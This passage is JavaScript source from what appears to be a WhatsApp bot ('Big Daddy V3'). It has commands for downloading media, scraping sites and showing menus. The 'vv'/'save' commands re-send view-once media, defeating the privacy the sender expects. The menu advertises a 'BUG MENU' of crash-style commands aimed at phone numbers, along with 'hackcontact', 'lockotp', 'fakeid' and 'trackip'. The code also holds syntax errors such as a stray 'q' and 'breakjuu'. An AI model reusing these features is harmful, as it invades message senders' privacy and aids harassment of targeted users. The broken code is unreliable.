                delete global.savedVideos[m.sender]; 
            })
            .on('error', (err) => {
                console.error('❌ FFmpeg Error:', err);
                replyphistar('❌ Error processing video: ' + err.message);
            });
    } catch (error) {
        console.error('❌ Error adding music:', error);
        replyphistar('❌ An error occurred while adding music.');
    }
    break;
}
case 'readviewonce': case 'vv': {
    try {
        if (!m.quoted) return replyphistar('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await PhistarBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await PhistarBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await PhistarBotInc.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        replyphistar('❌ An error occurred while processing your request.');
    }
    break;
}
case 'readviewonce2':
case 'vv2':
case 'save': {
    try {
        if (!m.quoted) return replyphistar('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ No media found in the quoted message.');q
        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await PhistarBotInc.sendMessage(m.sender, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await PhistarBotInc.sendMessage(m.sender, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await PhistarBotInc.sendMessage(m.sender, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv2/save command:', error);
        replyphistar('❌ Error saving media.');
    }
    break;
}
case 'webtoon': {
    async function webtoons(query) {
        return new Promise((resolve, reject) => {
            axios.get(`https://www.webtoons.com/id/search?keyword=${query}`)
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    const hasil = [];
                    $('#content > div.card_wrap.search._searchResult > ul > li').each(function(a, b) {
                        const result = {
                            status: 200,
                            Title: $(b).find('> a > div > p.subj').text(),
                            like: $(b).find('> a > div > p.grade_area > em').text(),
                            creator: $(b).find('> a > div > p.author').text(),
                            genre: $(b).find('> a > span').text(),
                            thumbnail: $(b).find('> a > img').attr('src'),
                            url: $(b).find('> a').attr('href')
                        };
                        hasil.push(result);
                    });
                    resolve(hasil);
                })
                .catch(reject);
        });
    }

    if (!text) return replyphistar('Enter the title you want to search for!!\nExample: .webtoon lookism');
    let results = await webtoons(text);
    if (results.length > 0) {
        let message = `Results of the search ${text} :\n\n`;
        results.forEach((result, index) => {
            message += `Title : ${result.Title}\nLike : ${result.like}\nCreator : ${result.creator}\nGenre : ${result.genre}\nLink Baca : ${result.url}\n\n`;
        });
        replyphistar(message);
    } else {
        replyphistar('No result.');
    }
    break;
}

case 'fdroid': {
    if (!q) return replyphistar(`Example: ${prefix + command}`);
    async function avzxxx(query) {
        const url = `https://search.f-droid.org/?q=${encodeURIComponent(query)}&lang=id`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const apps = [];
            $('.package-header').each((index, element) => {
                const title = $(element).find('.package-name').text().trim();
                const apkUrl = $(element).attr('href');
                const LinkGambar = $(element).find('.package-icon').attr('src');
                apps.push({ title, apkUrl, LinkGambar });
            });
            return apps;
        } catch (error) {
            // Error handled by outer catch
            return [];
        }
    }
    avzxxx(q).then(apps => {
        if (apps.length === 0) {
            replyphistar('No results found.');
            return;
        }
        let replyTextt = `Search results for "${q}":\n\n`;
        apps.forEach((app) => {
            replyTextt += `Title: ${app.title}\nApk Url: ${app.apkUrl}\nLink Gambar: ${app.LinkGambar}\n\n`;
        });
        replyphistar(replyTextt);
    }).catch(error => {
        replyphistar('An error occurred while searching F-Droid.');
    });
    break;
}

case 'style': case 'styletext': {
    async function styletext(teks) {
        return new Promise((resolve, reject) => {
            axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
                .then(({ data }) => {
                    let $ = cheerio.load(data);
                    let hasil = [];
                    $('table > tbody > tr').each(function (a, b) {
                        hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() });
                    });
                    resolve(hasil);
                });
        });
    }
    if (!text) return replyphistar('Enter Query text!');
    let anu = await styletext(text);
    let teks = `Style Text From ${text}\n\n`;
    for (let i of anu) {
        teks += `🍀 *${i.name}* : ${i.result}\n\n`;
    }
    replyphistar(teks);
    break;
}
case 'ytmp4': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        replyphistar('🔍 Fetching video, please wait...');

        // Step 1: Fetch video download details from David API
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(text)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.success) {
            const { title, download_url, thumbnail } = videoResponse.data.result;

            // Step 2: Send video preview
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: thumbnail },
                caption: `🎬 *Video Found* 🎬\n\n` +
                         `🎞️ *Title:* ${title}\n` +
                         `🔗 *YouTube Link:* ${text}\n\n` +
                         `📥 Downloading *video file* for you...`
            }, { quoted: m });

            // Step 3: Send the video file
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Error fetching the video!`);
        }

    } catch (err) {
        console.error("Error in ytmp4 command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'ytmp3': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        replyphistar('🔍 Fetching audio, please wait...');

        // Step 1: Fetch audio download details from David API
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(text)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.success) {
            const { title, download_url, thumbnail } = audioResponse.data.result;

            // Step 2: Send audio preview
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: thumbnail },
                caption: `🎧 *Audio Found* 🎧\n\n` +
                         `🎵 *Title:* ${title}\n` +
                         `🔗 *YouTube Link:* ${text}\n\n` +
                         `📥 Downloading *audio file* for you...`
            }, { quoted: m });

            // Step 3: Send the audio file
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Error fetching the audio!`);
        }

    } catch (err) {
        console.error("Error in ytmp3 command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
breakjuu
            
case 'menu':
case '.menu':
case 'alive':
case '?':
case 'Menu': {
    try {
        // React with 🌟 emoji
        await PhistarBotInc.sendMessage(m.chat, { react: { text: '🌟', key: m.key } });
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Get user's local time
        const userTime = new Date();
        const userHours = userTime.getHours();
        let greeting = userHours < 12 ? '☀️ *Good Morning*' : 
                      userHours < 18 ? '🌤 *Good Afternoon*' : '🌙 *Good Evening*';

        const formattedDateTime = userTime.toLocaleString('en-US', { 
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
        });
        const [datePart, timePart] = formattedDateTime.split(', ');

        // Randomly select one of the two images
        const images = [
            'https://i.postimg.cc/MZLRRX7q/IMG-20250625-004311-556.jpg',
            'https://i.postimg.cc/x8QdyD1G/IMG-20250823-WA004.jpg'
        ];
        const randomImage = images[Math.floor(Math.random() * images.length)];

        // BAILEYS-X: IMAGE + BUTTONS IN SAME MESSAGE
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: randomImage },
            caption: `
┌─❖
│ *Big Daddy V3*    
└┬❖  
┌┤ ${greeting} 😊
│└────────┈⳹  
│👤 ᴜsᴇʀ: ${m.pushName || 'Unknown'}
│📅 ᴅᴀᴛᴇ: ${datePart}
│⏰ ᴛɪᴍᴇ: ${timePart} 
│🛠️ ᴠᴇʀsɪᴏɴ: 3.0.0
└─────────────┈⳹
© *ᴘʜ✦ꜱᴛᴀʀ*`,
            buttons: [
                {
                    buttonId: 'mainmenu',
                    buttonText: { displayText: '📱 MAIN MENU' },
                    type: 1
                },
                {
                    buttonId: 'runtime', 
                    buttonText: { displayText: '🌟 RUNTIME' },
                    type: 1
                },
                {
                    buttonId: 'channel',
                    buttonText: { displayText: '📢 VIEW CHANNEL' },
                    type: 1
                }
            ]
        }, { quoted: m });

        // Audio message
        await new Promise(resolve => setTimeout(resolve, 1000));
        await PhistarBotInc.sendMessage(m.chat, {
            audio: fs.readFileSync('Phistar-media/𝓑𝓲𝓰𝓓𝓪𝓭𝓭𝔂.mp3'),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qsal });

    } catch (error) {
        console.error('Menu command error:', error);
    }
    break;
}
case 'runtime': {
    try {
        const phoneNumber = PhistarBotInc.user.id.split(':')[0];
        
        // Use the global function
        const connectionTime = global.getConnectionTime(phoneNumber);
        const uptime = Math.floor((Date.now() - connectionTime) / 1000);
        
        const response = `
╭─「 *RUNTIME* 」─⬣
│
│  ⏰ *Uptime:* ${global.runtime(uptime)}
│  🔗 *Connected since:* ${new Date(connectionTime).toLocaleString()}
│
╰─「 *PhistarBotInc* 」─⬣`;

        await PhistarBotInc.sendMessage(m.chat, {
            text: response,
            contextInfo: {
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "PhistarBotInc",
                    newsletterJid: "phistar@broadcast",
                    serverMessageId: Math.floor(Date.now() / 1000)
                },
                externalAdReply: {
                    title: "⏰ RUNTIME",
                    body: `${global.runtime(uptime)} online`,
                    thumbnailUrl: "https://i.postimg.cc/Kj5cMYwB/IMG-20250830-WA0005.jpg",
                    sourceUrl: "https://t.me/phistar"
                }
            }
        }, { quoted: m });
    } catch (error) {
        console.error('Runtime command error:', error);
        replyphistar('❌ Error calculating runtime');
    }
    break;
}

// CHANNEL HANDLER CASE
case 'channel':
case '.channel': {
    try {
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*Official Channel* \n\n` +
                  `Click the link below to join our WhatsApp channel for updates:\n\n` +
                  `🔗 *Channel Link:*\n` +
                  `https://whatsapp.com/channel/0029VagdMGd6LwHms3wqEm0m`,
            contextInfo: {
                forwardingScore: 999999,
                isForwarded: true
            }
        }, { quoted: m });
    } catch (error) {
        console.error('Channel command error:', error);
    }
    break;
}
case 'mainmenu':
case '.mainmenu':
    let mainMenu = `
╭⭑━━━➤ 𝐇𝐀𝐂𝐊 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐡𝐚𝐜𝐤𝐜𝐨𝐧𝐭𝐚𝐜𝐭
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐀𝐍𝐓𝐈 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤-𝐤𝐢𝐜𝐤
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤-𝐰𝐚𝐫𝐧 
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤-𝐝𝐞𝐥𝐞𝐭𝐞 
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐝𝐞𝐥𝐞𝐭𝐞 
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐬𝐩𝐚𝐦 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐭𝐚𝐠 <𝐨𝐧/𝐨𝐟𝐟>
╰━━━━━━━━━━━━━━━━━━╯

╭⭑━━━➤ 𝐀𝐈 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐜𝐡𝐚𝐭𝐠𝐩𝐭 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐜𝐨𝐩𝐢𝐥𝐨𝐭 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐥𝐥𝐚𝐦𝐚 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐦𝐞𝐭𝐚𝐢 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐞𝐦𝐢𝐧𝐢-𝐯𝐢𝐬𝐢𝐨𝐧 <𝐩𝐡𝐨𝐭𝐨>
┣◁️⚡💥 ${prefix}𝐠𝐞𝐦𝐢𝐧𝐢 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐞𝐦𝐢𝐧𝐢𝟐 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐞𝐦𝐦𝐚 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐢𝐭𝐡𝐮𝐛𝐫𝐨𝐚𝐬𝐭𝐞𝐫 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐜𝐨𝐩𝐢𝐥𝐨𝐭𝟐𝐭𝐫𝐢𝐩
┣◁️⚡💥 ${prefix}𝐡𝐞𝐫𝐦𝐞𝐓 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐛𝐥𝐚𝐜𝐤𝐛𝐨𝐱 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐜𝐥𝐚𝐮𝐝𝐞 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐝𝐞𝐞𝐩𝐬𝐞𝐞𝐤 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐝𝐞𝐞𝐏𝐬𝐞𝐞𝐤𝐫𝟏 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐦𝐞𝐭𝐚𝐢𝟐 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐢𝐭𝐚 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐦𝐢𝐬𝐭𝐫𝐚𝐥 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐦𝐮𝐬𝐥𝐢𝐦𝐚𝐢 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐩𝐨𝐰𝐞𝐫𝐛𝐫𝐚𝐢𝐧 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐪𝐰𝐞𝐧𝟐 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐪𝐯𝐪 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐭𝐞𝐚𝐜𝐡𝐚𝐢 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐨𝐨𝐝𝐲 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐡𝐮𝐦𝐚𝐧-𝐚𝐢 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐯𝐞𝐧𝐢𝐜𝐞 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐝𝐞𝐠𝐫𝐞𝐞𝐠𝐮𝐫𝐮 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐩𝐡𝐢-𝟑 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐦𝐢𝐬𝐭𝐫𝐚𝐥-𝐧𝐞𝐦𝐨 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐡𝐞𝐫𝐦𝐞𝐬-𝟑 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐥𝐨𝐫𝐢 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐪𝐰𝐪 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐜𝐨𝐦𝐦𝐚𝐧𝐝-𝐫-𝐩𝐥𝐮𝐬 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐪𝐰𝐞𝐧𝟐𝐜𝐨𝐝𝐞𝐫 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐩𝐭𝟒 <𝐪𝐮𝐞𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐧𝐞𝐦𝐨𝐭𝐫𝐨𝐧 <𝐪𝐮𝐞𝐫𝐲>
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐀𝐈 𝐈𝐌𝐀𝐆𝐄 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐟𝐥𝐮𝐱
┣◁️⚡💥 ${prefix}𝐟𝐥𝐮𝐱𝐩𝐫𝐨
┣◁️⚡💥 ${prefix}𝐝𝐢𝐟𝐟𝐮𝐬𝐢𝐨𝐧
┣◁️⚡💥 ${prefix}𝐭𝐞𝐱𝐭𝟐𝐢𝐦𝐠
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐌𝐔𝐒𝐈𝐂 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐩𝐥𝐚𝐲
┣◁️⚡💥 ${prefix}𝐬𝐨𝐧𝐠
┣◁️⚡💥 ${prefix}𝐯𝐢𝐝𝐞𝐨
┣◁️⚡💥 ${prefix}𝐩𝐥𝐚𝐲𝐝𝐨𝐜
┣◁️⚡💥 ${prefix}𝐯𝐢𝐝𝐞𝐨𝐝𝐨𝐜
┣◁️⚡💥 ${prefix}𝐲𝐭𝐦𝐩𝟑
┣◁️⚡💥 ${prefix}𝐲𝐭𝐦𝐩𝟒
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐭𝐢𝐤𝐭𝐨𝐤
┣◁️⚡💥 ${prefix}𝐭𝐭𝟐
┣◁️⚡💥 ${prefix}𝐭𝐭𝟑
┣◁️⚡💥 ${prefix}𝐭𝐭𝐬𝐥𝐢𝐝𝐞
┣◁️⚡💥 ${prefix}𝐢𝐠𝐦𝐩𝟒
┣◁️⚡💥 ${prefix}𝐢𝐠𝐝𝐥
┣◁️⚡💥 ${prefix}𝐠𝐝𝐫𝐢𝐯𝐞
┣◁️⚡💥 ${prefix}𝐬𝐟𝐢𝐥𝐞
┣◁️⚡💥 ${prefix}𝐚𝐢𝐨
┣◁️⚡💥 ${prefix}𝐠𝐨𝐫𝐞𝐝𝐥
┣◁️⚡💥 ${prefix}𝐭𝐰𝐢𝐭𝐭𝐞𝐫
┣◁️⚡💥 ${prefix}𝐠𝐢𝐭𝐜𝐥𝐨𝐧𝐞
┣◁️⚡💥 ${prefix}𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
┣◁️⚡💥 ${prefix}𝐚𝐩𝐤
┣◁️⚡💥 ${prefix}𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞
┣◁️⚡💥 ${prefix}𝐲𝐭𝐬
┣◁️⚡💥 ${prefix}𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤
┣◁️⚡💥 ${prefix}𝐭𝐞𝐫𝐚𝐛𝐨𝐱
┣◁️⚡💥 ${prefix}𝐥𝐲𝐫𝐢𝐜𝐬
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐧𝐮𝐤𝐞𝐛𝐥𝐚𝐬𝐭 (23491****)
┣◁️⚡💥 ${prefix}𝐝𝐚𝐫𝐤𝐯𝐨𝐢𝐝 (23491****)
┣◁️⚡💥 ${prefix}𝐯𝐞𝐧𝐨𝐦𝐬𝐭𝐫𝐢𝐤𝐞 (23491****)
┣◁️⚡💥 ${prefix}𝐩𝐡𝐚𝐧𝐭𝐨𝐦𝐤𝐢𝐥𝐥 (23491****)
┣◁️⚡💥 ${prefix}𝐝𝐞𝐚𝐭𝐡𝐩𝐮𝐥𝐬𝐞 (23491****)
┣◁️⚡💥 ${prefix}𝐭𝐨𝐱𝐢𝐜𝐬𝐭𝐨𝐫𝐦 (23-;;*;491****)
┣◁️⚡💥 ${prefix}𝐬𝐡𝐚𝐝𝐨𝐰𝐟𝐨𝐫𝐜𝐞 (23491****)
┣◁️⚡💥 ${prefix}𝐢𝐧𝐟𝐞𝐫𝐧𝐨 (23491****)
┣◁️⚡💥 ${prefix}𝐛𝐥𝐚𝐜𝐤𝐨𝐮𝐭 (23491****)
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐥𝐨𝐜𝐤𝐨𝐭𝐩
┣◁️⚡💥 ${prefix}𝐡𝐞𝐧𝐭𝐚𝐢
┣◁️⚡💥 ${prefix}𝐭𝐞𝐱𝐭𝟐𝐩𝐝𝐟
┣◁️⚡💥 ${prefix}𝐥𝐢𝐯𝐞𝐬𝐜𝐨𝐫𝐞𝐬
┣◁️⚡💥 ${prefix}𝐫𝐞𝐚𝐜𝐭𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐟𝐚𝐜𝐞𝐬𝐰𝐚𝐩
┣◁️⚡💥 ${prefix}𝐬𝐮𝐫𝐞𝐨𝐝𝐝𝐓
┣◁️⚡💥 ${prefix}𝐛𝐢𝐧
┣◁️⚡💥 ${prefix}𝐟𝐚𝐤𝐞𝐢𝐝
┣◁️⚡💥 ${prefix}𝐚𝐧𝐢𝐦𝐞 <𝐞𝐩𝐢𝐬𝐨𝐝𝐞>
┣◁️⚡💥 ${prefix}𝐜𝐮𝐭 <𝐬𝐭𝐚𝐫𝐭/𝐞𝐧𝐝>
┣◁️⚡💥 ${prefix}𝐬𝐚𝐯𝐞𝐯𝐢𝐝𝐞𝐨 <𝐯𝐢𝐝𝐞𝐨>
┣◁️⚡💥 ${prefix}𝐚𝐝𝐝𝐦𝐮𝐬𝐢𝐜 <𝐚𝐮𝐝𝐢𝐨>
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐭𝐭𝐬
┣◁️⚡💥 ${prefix}𝐩𝐢𝐧
┣◁️⚡💥 ${prefix}𝐝𝐢𝐚𝐫𝐲 <𝐞𝐧𝐭𝐫𝐲>
┣◁️⚡💥 ${prefix}𝐠𝐨𝐨𝐠𝐥𝐞𝐢𝐦𝐚𝐠𝐞
┣◁️⚡💥 ${prefix}𝐩𝐨𝐬𝐭 <𝐚𝐮𝐝𝐢𝐨>
┣◁️⚡💥 ${prefix}𝐬𝐡𝐚𝐳𝐚𝐦
┣◁️⚡💥 ${prefix}𝐚𝐮𝐝𝐢𝐨𝐦𝐚𝐜𝐤
┣◁️⚡💥 ${prefix}𝐩𝐡𝐨𝐭𝐨𝐥𝐞𝐚𝐩
┣◁️⚡💥 ${prefix}𝐩𝐢𝐜𝐬𝐮𝐦
┣◁️⚡💥 ${prefix}𝐧𝐩𝐦𝐬
┣◁️⚡💥 ${prefix}𝐬𝐤𝐞𝐭𝐜𝐡
┣◁️⚡💥 ${prefix}𝐩𝐥𝐚𝐲𝐬𝐭𝐨𝐫𝐞
┣◁️⚡💥 ${prefix}𝐩𝐢𝐱𝐢𝐯
┣◁️⚡💥 ${prefix}𝐜𝐚𝐭𝐡𝐨𝐥𝐢𝐜
┣◁️⚡💥 ${prefix}𝐟𝐨𝐧𝐭
┣◁️⚡💥 ${prefix}𝐬𝐞𝐚𝐫𝐜𝐡𝐠𝐫𝐨𝐮𝐩
┣◁️⚡💥 ${prefix}𝐭𝐨𝐢𝐦𝐠 <𝐬𝐭𝐢𝐜𝐤𝐞𝐫>
┣◁️⚡💥 ${prefix}𝐭𝐨𝐯𝐢𝐝𝐞𝐨 <𝐬𝐭𝐢𝐜𝐤𝐞𝐫>
┣◁️⚡💥 ${prefix}𝐭𝐨𝐦𝐩𝟑
┣◁️⚡💥 ${prefix}𝐬𝐩𝐨𝐭𝐢𝐟𝐲𝐬𝐞𝐚𝐫𝐜𝐡
┣◁️⚡💥 ${prefix}𝐧𝐠𝐥
┣◁️⚡💥 ${prefix}𝐭𝐞𝐜𝐡𝐧𝐞𝐰𝐬
┣◁️⚡💥 ${prefix}𝐬𝐭𝐞𝐚𝐦𝐬𝐞𝐚𝐫𝐜𝐩
┣◁️⚡💥 ${prefix}𝐜𝐡𝐨𝐫𝐝
┣◁️⚡💥 ${prefix}𝐭𝐭𝐬𝐞𝐚𝐫𝐜𝐡
┣◁️⚡💥 ${prefix}𝐭𝐫
┣◁️⚡💥 ${prefix}𝐟𝐢𝐥𝐦𝐬𝐞𝐚𝐫𝐜𝐡
┣◁️⚡💥 ${prefix}𝐠𝐫𝐨𝐮𝐩𝐬𝐞𝐚𝐫𝐜𝐡
┣◁️⚡💥 ${prefix}𝐭𝐫𝐚𝐜𝐤𝐢𝐩
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭
┣◁️⚡💥 ${prefix}𝐟𝐞𝐭𝐜𝐡
┣◁️⚡💥 ${prefix}𝐟𝐝𝐫𝐨𝐢𝐝
┣◁️⚡💥 ${prefix}𝐬𝐭𝐲𝐥𝐞𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐜𝐢𝐧𝐞𝐦𝐚
┣◁️⚡💥 ${prefix}𝐪𝐮𝐨𝐭𝐞𝐬𝐬
┣◁️⚡💥 ${prefix}𝐪𝐮𝐨𝐭𝐞𝐝
┣◁️⚡💥 ${prefix}𝐰𝐚𝐭𝐭𝐩𝐚𝐝
┣◁️⚡💥 ${prefix}𝐯𝐯
┣◁️⚡💥 ${prefix}𝐭𝐫𝐚𝐧𝐬𝐥𝐚𝐭𝐞
┣◁️⚡💥 ${prefix}𝐫𝐞𝐚𝐝𝐦𝐨𝐫𝐞
┣◁️⚡💥 ${prefix}𝐩𝐢𝐧𝐜𝐡𝐚𝐭
┣◁️⚡💥 ${prefix}𝐪𝐮𝐫𝐚𝐧
┣◁️⚡💥 ${prefix}𝐛𝐢𝐛𝐥𝐞
┣◁️⚡💥 ${prefix}𝐞𝐦𝐨𝐣𝐢𝐦𝐢𝐱
┣◁️⚡💥 ${prefix}𝐩𝐞𝐫𝐢𝐨𝐝𝐢𝐜-𝐭𝐚𝐛𝐥𝐞
┣◁️⚡💥 ${prefix}𝐮𝐧𝐩𝐢𝐧𝐜𝐡𝐚𝐭
┣◁️⚡💥 ${prefix}𝐨𝐜𝐫
┣◁️⚡💥 ${prefix}𝐜𝐚𝐥𝐜𝐮𝐥𝐚𝐭𝐨𝐫
┣◁️⚡💥 ${prefix}𝐟𝐚𝐜𝐭
┣◁️⚡💥 ${prefix}𝐡𝐝𝐯𝐢𝐝𝐞𝐨
┣◁️⚡💥 ${prefix}𝐜𝐨𝐧𝐯𝐞𝐫𝐭
┣◁️⚡💥 ${prefix}𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐭𝐢𝐦𝐞
┣◁️⚡💥 ${prefix}𝐥𝐢𝐬𝐭𝐜𝐮𝐫𝐫𝐞𝐧𝐜𝐲
┣◁️⚡💥 ${prefix}𝐜𝐫𝐞𝐚𝐭𝐞𝐦𝐞𝐦𝐞
┣◁️⚡💥 ${prefix}𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝
┣◁️⚡💥 ${prefix}𝐫𝐞𝐦𝐢𝐧𝐝𝐦𝐞
┣◁️⚡💥 ${prefix}𝐰𝐚𝐧𝐮𝐦𝐧𝐞𝐫
┣◁️⚡💥 ${prefix}𝐬𝐚𝐯𝐞
